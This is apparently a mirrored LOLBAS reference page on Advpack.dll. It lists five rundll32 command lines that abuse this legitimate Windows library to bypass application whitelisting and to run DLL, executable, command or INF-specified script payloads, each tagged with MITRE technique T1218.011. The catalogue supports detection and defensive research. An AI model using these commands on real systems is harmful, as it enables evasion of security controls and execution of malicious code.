# LOLBAS: Advpack.dll

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `AWL Bypass`, `Execute`

Utility for installing software and drivers with rundll32.exe

## Comandos

### Run local or remote script(let) code through INF file specification.

AWL Bypass · priv: User · T1218.011

```cmd
rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,
```

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).

### Run local or remote script(let) code through INF file specification.

AWL Bypass · priv: User · T1218.011

```cmd
rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},,1,
```

Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).

### Load a DLL payload.

Execute · priv: User · T1218.011

```cmd
rundll32.exe advpack.dll,RegisterOCX {PATH:.dll}
```

Launch a DLL payload by calling the RegisterOCX function.

### Run an executable payload.

Execute · priv: User · T1218.011

```cmd
rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}
```

Launch an executable by calling the RegisterOCX function.

### Run an executable payload.

Execute · priv: User · T1218.011

```cmd
rundll32 advpack.dll, RegisterOCX {CMD}
```

Launch command line by calling the RegisterOCX function.

